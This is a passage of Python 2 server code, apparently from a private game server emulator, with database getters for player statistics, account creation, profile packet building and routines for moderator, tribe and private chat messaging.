            return -1
        self.Database.execute('UPDATE users SET shamItens = ? WHERE name = ?', [str(itens), username])

    def getLastConnection(self, get, username, time = None):
        if get:
            if username.startswith('*'):
                return 0
            self.Database.execute('select last_connection from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return 0
            else:
                return rrf[0]
        elif not get:
            self.Database.execute('UPDATE users SET last_connection = ? WHERE name = ?', [time, username])
        return

    def getSavesCount(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select saves from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getLevelCount(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select level from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getBotOwner(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select owner from bots where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getShamanCheeseCount(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select shamcheese from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getShamanGoldSavesCount(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select HardModeSaves from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getMapcrew(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select ismapcrew from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getRalute(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select ralute from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getFirstCount(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select first from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getGiftsCount(self, username):
        if username.startswith('*'):
            return '0#0#0'
        else:
            self.Database.execute('select gifts from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return '0#0#0'
            return str(rrf[0])
            return

    def getCheeseCount(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select cheese from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getRoundsCount(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select rounds from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getBootcampCount(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select bootcamp from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getPointsCount(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select points from users  where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getFullTitleList(self, username):
        if username.startswith('*'):
            return '[]'
        else:
            self.Database.execute('select titlelist from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getTitleLists(self, username):
        if username.startswith('*'):
            return ('[]', '[]', '[]', '[]', '[]', '[]', '[]', '[]')
        else:
            self.Database.execute('select CheeseTitleList, FirstTitleList, ShamanTitleList, ShopTitleList, GiftTitleList, HardModeTitleList, BootcampTitleList, DivineModeTitleList from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf
            return

    def getBadgeLists(self, username):
        if username.startswith('*'):
            return ''
        else:
            self.Database.execute('select BadgeList from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getTribeInfo(self, username):
        if username.startswith('*'):
            return False
        else:
            self.Database.execute('select tribe from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return False
            return rrf[0].rsplit(':', 2)[0]
            return

    def getUserTribeInfo(self, username):
        if username.startswith('*'):
            return ''
        else:
            self.Database.execute('select tribe from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0].rsplit(':', 2)
            return

    def getCurrentTitle(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select currenttitle from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getUserShop(self, username):
        if username.startswith('*'):
            return ''
        else:
            self.Database.execute('select shop from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getUserFriends(self, username):
        if username.startswith('*'):
            return ''
        else:
            self.Database.execute('select friends from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getUserIgnoreds(self, username):
        if username.startswith('*'):
            return ''
        else:
            self.Database.execute('select ignoreds from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getUserVisuals(self, username):
        if username.startswith('*'):
            return ''
        else:
            self.Database.execute('select visuals from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getUserLook(self, username):
        if username.startswith('*'):
            return '1;0,0,0,0,0,0,0,0,0'
        else:
            self.Database.execute('select look from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getShopCheese(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select shopcheese from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getShopFraises(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select fraises from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getShopCoins(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select eventmoney from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def getNamePlayerData(self, id):
        self.Database.execute('select name from users where id = ?', [id])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf[0]
            return

    def getTotalBanHours(self, username):
        if username.startswith('*'):
            return '0'
        else:
            self.Database.execute('select totalban from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def checkExistingUsers(self, username):
        self.Database.execute('select name from users where name = ?', [username])
        rrf = self.Database.fetchone()
        if rrf is None:
            return 0
        else:
            return 1
            return

    def checkExistingTribes(self, name):
        self.Database.execute('select name from Tribu where name = ?', [name])
        rrf = self.Database.fetchone()
        if rrf is None:
            return 0
        else:
            return 1
            return

    def createAccount(self, username, passwordHash):
        name = username
        password = passwordHash
        shopcheese = 0
        shopfraise = 0
        saves = 0
        shamcheese = 0
        first = 0
        cheese = 0
        bootcamp = 0
        titlelist = ['0']
        titlelist = json.dumps(titlelist)
        tribe = ''
        shop = ''
        friends = ''
        look = '1;0,0,0,0,0,0,0,0,0'
        totalban = 0
        TribuGradeJoueur = 0
        facebook = 0
        CheeseTitleList = '[]'
        FirstTitleList = '[]'
        ShamanTitleList = '[]'
        ShopTitleList = '[]'
        GiftTitleList = '[]'
        Email = ''
        EmailInfo = ''
        ColorInfo = '78583a#95d9d6'
        gifts = '0#0#0'
        date = str(int(round(getTime() * 1000)))
        skillsData = '20#0#320'
        skills = ''
        visuals = ''
        BadgeList = ''
        ignoreds = ''
        marriage = ''
        shamItens = ''
        self.Database.execute('insert into users (name, password, id, privlevel, saves, shamcheese, first, cheese, rounds, titlelist, tribe, currenttitle, shop, friends, look, shopcheese, totalban, TribuGradeJoueur, facebook, CheeseTitleList, FirstTitleList, ShamanTitleList, ShopTitleList, GiftTitleList, HardMode, HardModeSaves, HardModeTitleList, Email, Emailinfo, Colorinfo, bootcamp, BootcampTitleList, fraises, gifts, date, ismapcrew, mapcrew, eventmoney, skills, skillsData, skillsRedistribute, visuals, last_connection, ignoreds, lua, gender, marriage, marriageTime, passwordHash, shamItens, itensSham, DivineModeSaves, DivineModeTitleList, BadgeList, lastReceivedGifts, lastReceivedMessages, SurvivorStats) values (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', (name,
         None,
         None,
         1,
         saves,
         0,
         first,
         cheese,
         0,
         titlelist,
         tribe,
         0,
         shop,
         friends,
         look,
         shopcheese,
         0,
         0,
         0,
         CheeseTitleList,
         FirstTitleList,
         ShamanTitleList,
         ShopTitleList,
         GiftTitleList,
         0,
         0,
         '[]',
         Email,
         EmailInfo,
         ColorInfo,
         bootcamp,
         '[]',
         shopfraise,
         0,
         date,
         0,
         None,
         0,
         skills,
         skillsData,
         0,
         '',
         0,
         '',
         0,
         0,
         '',
         0,
         password,
         '',
         '{}',
         0,
         '[]',
         '',
         '',
         '',
         '0,0,0,0'))
        return

    def getMapName(self, code):
        self.Database.execute('select name from mapeditor where code = ?', [code])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf[0]
            return

    def Demonbane(self):
        pass

    def getMapXML(self, code):
        self.Database.execute('select mapxml from mapeditor where code = ?', [code])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf[0]
            return

    def getMapYesVotes(self, code):
        self.Database.execute('select yesvotes from mapeditor where code = ?', [code])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf[0]
            return

    def getMapNoVotes(self, code):
        self.Database.execute('select novotes from mapeditor where code = ?', [code])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf[0]
            return

    def getMapPerma(self, code):
        self.Database.execute('select perma from mapeditor where code = ?', [code])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf[0]
            return

    def getMapDel(self, code):
        self.Database.execute('select deleted from mapeditor where code = ?', [code])
        rrf = self.Database.fetchone()
        if rrf is None:
            return -1
        else:
            return rrf[0]
            return

    def getIPPermaBan(self, ip):
        if ip in self.IPPermaBanCache:
            return 1
        else:
            self.Database.execute('select * from ippermaban where ip = ?', [ip])
            rrf = self.Database.fetchone()
            if rrf is None:
                return 0
            self.IPPermaBanCache.append(ip)
            return 1
            return

    def getProfileData(self, username):
        found = False
        for room in self.rooms.values():
            for client in room.clients.values():
                if client.username == username:
                    if client.isInTribe:
                        tribe = client.TribeName
                    else:
                        tribe = ''
                    stats = ','.join(map(str, [client.micesaves,
                     client.shamancheese,
                     client.firstcount,
                     client.cheesecount,
                     client.hardModeSaves,
                     client.bootcampcount,
                     client.divineModeSaves]))
                    userlook = client.look
                    color1 = client.color1
                    date = client.datereg
                    p = ByteArray.ByteArray()
                    p.writeInt(client.cppid)
                    p.writeUTF(username)
                    p.writeUTF(stats)
                    if str(client.titleNumber).isdigit():
                        p.writeShort(int(client.titleNumber))
                    else:
                        t, c = str(client.titleNumber).split(',')
                        p.writeShort(int(t))
                    p.writeShort(len(client.titleList))
                    for i in client.titleList:
                        if ',' in str(i):
                            t, c = str(i).split(',')
                            p.writeShort(int(t))
                            p.writeByte(int(c))
                        else:
                            p.writeShort(int(i))
                            p.writeByte(1)

                    p.writeUTF(userlook)
                    p.writeUTF(tribe)
                    p.writeInt(int(str(date)[:len(str(date)) - 3]))
                    p.writeInt(int(color1, 16))
                    p.writeShort(client.playerLevel)
                    p.writeByte(client.gender)
                    priv = client.privilegeLevel
                    if priv is 1:
                        p.writeByte(0)
                    else:
                        p.writeByte(priv if priv is 10 else (6 if priv in (8, 6, 5) else (priv if priv is 20 else 0)))
                    p.writeByte(1)
                    p.writeUTF(client.marriage)
                    p.writeByte(len(client.Badges))
                    for i in client.Badges:
                        p.writeByte(int(i))

                    stats = ([30,
                      client.racingStats[0],
                      1500,
                      124],
                     [31,
                      client.racingStats[1],
                      10000,
                      125],
                     [33,
                      client.racingStats[2],
                      10000,
                      126],
                     [32,
                      client.racingStats[3],
                      10000,
                      127],
                     [26,
                      client.survivorStats[0],
                      1000,
                      120],
                     [27,
                      client.survivorStats[1],
                      800,
                      121],
                     [28,
                      client.survivorStats[2],
                      20000,
                      122],
                     [29,
                      client.survivorStats[3],
                      10000,
                      123])
                    p.writeByte(len(stats))
                    for stat in stats:
                        p.writeByte(int(stat[0]))
                        p.writeInt(int(stat[1]))
                        p.writeInt(int(stat[2]))
                        p.writeByte(int(stat[3]))

                    found = p.toString()

        return found

    def verifyIsModOnline(self):
        mods = []
        if len(self.ModList) > 0:
            for langue, players in self.ModList.items():
                for i in players:
                    found = self.checkAlreadyConnectedAccount(i)
                    if not found:
                        self.ModList[langue].remove(i)
                    else:
                        mods.append(i)

            self.checkIfModOnlines()
        self.updateModeratorOnlineTime = reactor.callLater(650, self.verifyIsModOnline)

    def getModList(self):
        found = 'Online mods:'
        k = []
        if len(self.ModList) > 0:
            for langue, players in self.ModList.items():
                r1 = '[%s] ' % langue.lower()
                r2 = '<BV>' + '<BL>, <BV>'.join(players)
                k.append(r1 + r2)

            return '\n'.join(map(str, [found] + k))
        else:
            return "There isn't any mod online."

    def getProfileTitle(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = player.titleNumber

        return found

    def getProfileTribe(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    if player.isInTribe:
                        found = player.TribeName
                    else:
                        found = ''

        return found

    def getProfileSaves(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = player.micesaves

        return found

    def getProfileHardModeSaves(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = player.hardModeSaves

        return found

    def getProfileBootcampcount(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = player.bootcampcount

        return found

    def getProfileShamanCheese(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = player.shamancheese

        return found

    def getProfileFirstCount(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = player.firstcount

        return found

    def getProfileCheeseCount(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = player.cheesecount

        return found

    def getPlayerPriv(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = True
                    priv = player.privilegeLevel

        if found:
            return priv
        else:
            return 1

    def getNewProfileTitleList(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    titlelist = player.titleList
                    return titlelist

        return found

    def getProfileTitleList(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    titlelist = player.titleList
                    titlelist = json.dumps(titlelist)
                    titlelist = titlelist.replace('[', '')
                    titlelist = titlelist.replace(']', '')
                    titlelist = titlelist.replace('"', '')
                    titlelist = titlelist.replace(' ', '')
                    return titlelist

        return found

    def getPlayerCode(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = player.playerCode

        return found

    def getPlayerHardMode(self, playercode):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.playerCode == playercode:
                    found = player.hardMode

        return found

    def playerBadgeCode(self, playercode):
        badge = {'0': {'count': 0},
         '1': {'count': 0},
         '2': {'count': 0},
         '3': {'count': 0},
         '4': {'count': 0}}
        badgecode = 0
        badgepoint = []
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.playerCode == playercode:
                    if ',' in player.playerSkills:
                        skill_base = player.playerSkills.split(',')
                    elif player.playerSkills == '':
                        skill_base = []
                    else:
                        skill_base = [player.playerSkills]
                    if len(skill_base) >= 1:
                        for val in skill_base:
                            skill_id, count = val.split('_', 1)
                            if int(skill_id) > -1 and int(skill_id) < 14:
                                badge['0']['count'] += int(count)
                            elif int(skill_id) > 19 and int(skill_id) < 35:
                                badge['1']['count'] += int(count)
                            elif int(skill_id) > 39 and int(skill_id) < 55:
                                badge['2']['count'] += int(count)
                            elif int(skill_id) > 59 and int(skill_id) < 75:
                                badge['4']['count'] += int(count)
                            elif int(skill_id) > 80 and int(skill_id) < 95:
                                badge['3']['count'] += int(count)

                    for x, c in badge.items():
                        badgepoint.append(c)

                    for x, c in badge.items():
                        if c == max(badgepoint):
                            badgecode = int(x)

                    break

        if badge['0']['count'] == 0 and badge['1']['count'] == 0 and badge['2']['count'] == 0 and badge['3']['count'] == 0 and badge['4']['count'] == 0:
            return 0
        return badgecode

    def getPlayerLevel(self, playercode):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.playerCode == playercode:
                    found = True
                    lvl = player.playerLevel

        if found:
            return lvl
        else:
            return 1

    def getPlayerLevelName(self, username):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    found = True
                    lvl = player.playerLevel

        if found:
            return lvl
        else:
            return 1

    def getPlayerHardModetwo(self, playercode, playercode2):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.playerCode == playercode:
                    found = player.hardMode

            for player2 in room.clients.values():
                if player2.playerCode == playercode2:
                    found = player2.hardMode

        return found

    def sendWholeServer(self, eventTokens, data, binary = None):
        for room in self.rooms.values():
            if binary:
                reactor.callLater(0, room.sendAllBin, eventTokens, data)
            else:
                reactor.callLater(0, room.sendAll, eventTokens, data)

    def sendWholeServerLocal(self, senderClient, eventTokens, data, binary = None):
        for room in self.rooms.values():
            if room.community.startswith(senderClient.Langue):
                if binary:
                    reactor.callLater(0, room.sendAllBin, eventTokens, data)
                else:
                    reactor.callLater(0, room.sendAll, eventTokens, data)

    def sendModuleTeamChat(self, senderClient, eventTokens, data, binary = None):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel >= 4 or client.ModuleTeam:
                    if binary:
                        client.sendData(eventTokens, data, True)
                    else:
                        client.sendData(eventTokens, data)

    def sendMapCrewChat(self, senderClient, eventTokens, data, binary = None):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel >= 4 or client.isMapcrew:
                    if binary:
                        client.sendData(eventTokens, data, True)
                    else:
                        client.sendData(eventTokens, data)

    def sendArbChatLocal(self, senderClient, eventTokens, data, binary = None):
        for room in self.rooms.values():
            if room.community.startswith(senderClient.Langue):
                for playerCode, client in room.clients.items():
                    if client.privilegeLevel >= 3:
                        if binary:
                            reactor.callLater(0, client.sendData, eventTokens, data, True)
                        else:
                            reactor.callLater(0, client.sendData, eventTokens, data)

    def sendModChatLocal(self, senderClient, eventTokens, data, binary = None):
        for room in self.rooms.values():
            if room.community.startswith(senderClient.Langue):
                for playerCode, client in room.clients.items():
                    if client.privilegeLevel >= 4:
                        if binary:
                            reactor.callLater(0, client.sendData, eventTokens, data, True)
                        else:
                            reactor.callLater(0, client.sendData, eventTokens, data)

    def sendModChat(self, senderClient, eventTokens, data, binary = None):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel >= 4:
                    if binary:
                        reactor.callLater(0, client.sendData, eventTokens, data, True)
                    else:
                        reactor.callLater(0, client.sendData, eventTokens, data)

    def sendArbChat(self, senderClient, eventTokens, data, binary = None):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel >= 3:
                    if binary:
                        reactor.callLater(0, client.sendData, eventTokens, data, True)
                    else:
                        reactor.callLater(0, client.sendData, eventTokens, data)

    def updateColor(self, username):
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username.lower().capitalize() == username.lower().capitalize():
                    color1, color2 = self.mouseColorInfo(True, username.lower().capitalize(), '')
                    client.color1 = color1
                    if color2 == '':
                        if client.micesaves >= 1:
                            client.color2 = 'fade55'
                        else:
                            client.color2 = '95d9d6'
                    else:
                        client.color2 = color2

    def sendMappersChat(self, senderClient, eventTokens, data, binary = None):
        for room in self.rooms.values():
            if binary:
                reactor.callLater(0, room.sendAllPvSpec2, eventTokens, [10,
                 8,
                 6,
                 5,
                 4,
                 3], data, True)
            else:
                reactor.callLater(0, room.sendAllPvSpec2, eventTokens, [10,
                 8,
                 6,
                 5,
                 4,
                 3], data)

    def getTribeRankingList(self, code):
        self.Database.execute('SELECT name, id, position, perm, remove FROM tribu_rank WHERE tribe_id = ?', [code])
        rrf = self.Database.fetchall()
        if rrf is None:
            pass
        else:
            return rrf
        return

    def checkTribeRankingName(self, code, name):
        self.Database.execute('SELECT name FROM tribu_rank WHERE tribe_id = ? and name = ?', [code, name])
        rrf = self.Database.fetchone()
        if rrf is None:
            return False
        else:
            return True
            return

    def sendTribulleChannel(self, data, senderClient, cid, message):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if cid in player.MyChats:
                    player.sendTribulleProtocol(data, struct.pack('!ih', cid, len(senderClient.username)) + senderClient.username + message + senderClient.LangueByte)

    def getChatOrTribeNewId(self, info = 0):
        if info == 0:
            temp = int(self.getServerSetting('LastChatCode')) + 1
            self.Database.execute('UPDATE settings SET value = ? WHERE setting = ?', [str(temp), 'LastChatCode'])
        else:
            temp = int(self.getServerSetting('LastTribuCode')) + 1
            self.Database.execute('UPDATE settings SET value = ? WHERE setting = ?', [str(temp), 'LastTribuCode'])
        return temp

    def sendFriendListCheck(self, username, me):
        found = False
        if username.isalpha() and me.isalpha:
            f_list = self.getUserFriends(username)
            f_list = f_list.strip('[]').replace(' ', '').replace('"', '').replace(',', ' ')
            if f_list == '':
                f_list = []
            else:
                f_list = f_list.split(' ')
            for name in f_list:
                if me == name:
                    found = True
                    break

        return found

    def sendTribeInvite(self, senderClient, code, name, tribe):
        if len(name) < 3 or len(name) > 12:
            pass
        else:
            name = name.lower().capitalize()
        for room in self.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == name:
                    if client.isInTribe:
                        senderClient.sendPlayerAlreadyInTribe()
                    else:
                        client.AcceptableInvites.append(str(code))
                        client.sendTribeInvite(code, senderClient.username, tribe)
                        senderClient.sendInvitationSent()

    def sendWholeTribe(self, senderClient, eventTokens, data, binary = None, NotIgnorable = None):
        for room in self.rooms.values():
            if binary:
                reactor.callLater(0, room.sendWholeTribeRoom, senderClient, eventTokens, data, binary)
            elif NotIgnorable:
                reactor.callLater(0, room.sendWholeTribeRoom, senderClient, eventTokens, data, binary, NotIgnorable)
            else:
                reactor.callLater(0, room.sendWholeTribeRoom, senderClient, eventTokens, data)

    def sendTribulleWholeTribe(self, senderClient, eventTokens, data, NotIgnorable = None):
        for room in self.rooms.values():
            if NotIgnorable:
                room.sendTribulleWholeTribeRoom(senderClient, eventTokens, data, NotIgnorable)
            else:
                room.sendTribulleWholeTribeRoom(senderClient, eventTokens, data)

    def sendWholeTribeOthers(self, senderClient, eventTokens, data, binary = None, NotIgnorable = None):
        for room in self.rooms.values():
            if binary:
                reactor.callLater(0, room.sendWholeTribeOthersRoom, senderClient, eventTokens, data, binary)
            elif NotIgnorable:
                reactor.callLater(0, room.sendWholeTribeOthersRoom, senderClient, eventTokens, data, binary, NotIgnorable)
            else:
                reactor.callLater(0, room.sendWholeTribeOthersRoom, senderClient, eventTokens, data)

    def sendTribeInfoUpdate(self, code, greeting = None, playerlist = None):
        for room in self.rooms.values():
            if greeting:
                reactor.callLater(0, room.sendTribeInfoUpdateRoom, code, greeting)
            elif playerlist:
                reactor.callLater(0, room.sendTribeInfoUpdateRoom, code, greeting, playerlist)
            else:
                reactor.callLater(0, room.sendTribeInfoUpdateRoom, code)

    def changePrivLevel(self, username, privlevel):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    player.privilegeLevel = privlevel
                    player.sendData('\x1a\x08', [player.username,
                     player.playerCode,
                     privlevel,
                     0,
                     0])
                    found = True
                    break

            if found:
                break

        return found

    def setUserBot(self, username, bot):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    if bot == 0:
                        player.isUserBot = False
                    elif bot == 1:
                        player.isUserBot = True
                    found = True
                    break

            if found:
                break

        return found

    def setMapcrew(self, playerName, mapcrew):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == playerName:
                    if mapcrew == 0:
                        player.isMapcrew = False
                    elif mapcrew == 1:
                        player.isMapcrew = True
                    found = True
                    break

            if found:
                break

        return found

    def sendRefreshShop(self):
        for room in self.rooms.values():
            for player in room.clients.values():
                player.shoplist = self.shopList

    def friendsListCheck(self, username, friendtc):
        found = False
        username = username.lower().capitalize()
        friendtc = friendtc.lower().capitalize()
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == username:
                    if friendtc in player.friendsList:
                        found = True
                    break

        return found

    def sendTribullePrivateMessage(self, super, playerName, Message):
        found = False
        for room in self.rooms.values():
            for client in room.clients.values():
                if client.username == playerName:
                    found = client
                    break

            if found:
                break

        if found:
            if found.silence:
                if super.privilegeLevel in (10,):
                    data = super.Tribulle.Pack('ET_RecoitMessagePrive')
                    r = self.parseByte.ByteArray(data)
                    s = self.parseByte.ByteArray(data)
                    r.writeUTF(playerName.lower())
                    r.writeUTF(Message)
                    r.writeBytes(found.LangueByte)
                    r.writeBoolean(True)
                    super.sendData('<\x01', r.toString(), True)
                    s.writeUTF(super.username.lower())
                    s.writeUTF(Message)
                    s.writeBytes(super.LangueByte)
                    s.writeBoolean(False)
                    found.sendData('<\x01', s.toString(), True)
                elif self.friendsListCheck(playerName, super.username):
                    if found.silenceData[0] in (2, '2'):
                        data = super.Tribulle.Pack('ET_RecoitMessagePriveSysteme')
                        p = self.parseByte.ByteArray(data)
                        p.writeUTF(playerName.lower())
                        if len(str(found.silenceData[1])) > 0:
                            p.writeUTF('${trad#Silence} : %s' % found.silenceData[1])
                        else:
                            p.writeUTF('${trad#Silence}')
                        print repr(p.toString())
                        super.sendData('<\x01', p.toString(), True)
                    else:
                        data = super.Tribulle.Pack('ET_RecoitMessagePrive')
                        r = self.parseByte.ByteArray(data)
                        s = self.parseByte.ByteArray(data)
                        r.writeUTF(playerName.lower())
                        r.writeUTF(Message)
                        r.writeBytes(found.LangueByte)
                        r.writeBoolean(True)
                        super.sendData('<\x01', r.toString(), True)
                        s.writeUTF(super.username.lower())
                        s.writeUTF(Message)
                        s.writeBytes(super.LangueByte)
                        s.writeBoolean(False)
                        found.sendData('<\x01', s.toString(), True)
                else:
                    data = super.Tribulle.Pack('ET_RecoitMessagePriveSysteme')
                    p = self.parseByte.ByteArray(data)
                    p.writeUTF(playerName.lower())
                    if len(str(found.silenceData[1])) > 0:
                        p.writeUTF('${trad#Silence} : %s' % found.silenceData[1])
                    else:
                        p.writeUTF('${trad#Silence}')
                    print repr(p.toString())
                    super.sendData('<\x01', p.toString(), True)
            else:
                data = super.Tribulle.Pack('ET_RecoitMessagePrive')
                r = self.parseByte.ByteArray(data)
                s = self.parseByte.ByteArray(data)
                r.writeUTF(playerName.lower())
                r.writeUTF(Message)
                r.writeBytes(found.LangueByte)
                r.writeBoolean(True)
                super.sendData('<\x01', r.toString(), True)
                s.writeUTF(super.username.lower())
                s.writeUTF(Message)
                s.writeBytes(super.LangueByte)
                s.writeBoolean(False)
                found.sendData('<\x01', s.toString(), True)
        return found

    def sendPrivMsg(self, senderClient, fromUsername, toUsername, message):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == toUsername:
                    if player.silence:
                        if senderClient.privilegeLevel in (10, 8, 6, 5, 4, 3):
                            senderClient.sendSentPrivMsg(toUsername, message)
                            if player.censorChat:
                                message = player.censorMessage(message)
                            cmmy = senderClient.Langue
                            player.sendRecievePrivMsg(fromUsername, message, cmmy)
                        else:
                            senderClient.sendDisabledWhispers(toUsername)
                    else:
                        senderClient.sendSentPrivMsg(toUsername, message)
                        if player.censorChat:
                            message = player.censorMessage(message)
                        cmmy = senderClient.Langue
                        player.sendRecievePrivMsg(fromUsername, message, cmmy)
                    found = True

        return found

    def sendPrivMsgF(self, senderClient, fromUsername, toUsername, message):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == toUsername:
                    if player.silence:
                        senderClient.sendDisabledWhispers(toUsername)
                    else:
                        senderClient.sendSentPrivMsg(toUsername, message)
                    found = True

        return found

    def sendRoomInvite(self, senderClient, fromUsername, toUsername):
        found = False
        for room in self.rooms.values():
            for player in room.clients.values():
                if player.username == toUsername:
                    if senderClient.Langue == 'br':
                        senderClient.sendData('\x1a\x04', ['<BL>Convite Enviado.'])
                    elif senderClient.Langue == 'en':
                        senderClient.sendData('\x1a\x04', ['<BL>Invitation sent.'])
                    elif senderClient.Langue == 'es':
                        senderClient.sendData('\x1a\x04', ['<BL>Invitaci\xc3\xb3n enviada.'])
                    if player.Langue == 'br':
                        player.sendData('\x1a\x04', ['<BL>' + fromUsername + ' est\xc3\xa1 convidando voc\xc3\xaa para sua sala privada. Digite "/join ' + fromUsername + '" para entrar.'])
                    elif player.Langue == 'en':
                        player.sendData('\x1a\x04', ['<BL>' + fromUsername + ' is inviting you for your private room. Type "/join ' + fromUsername + '" to go.'])
                    elif player.Langue == 'es':
                        player.sendData('\x1a\x04', ['<BL>' + fromUsername + ' te invita a su habitaci\xc3\xb3n privada. Entra "/join ' + fromUsername + '" para empezar.'])
                    found = True

        return found

    def sendMuMute(self, username, modname):
        found = False
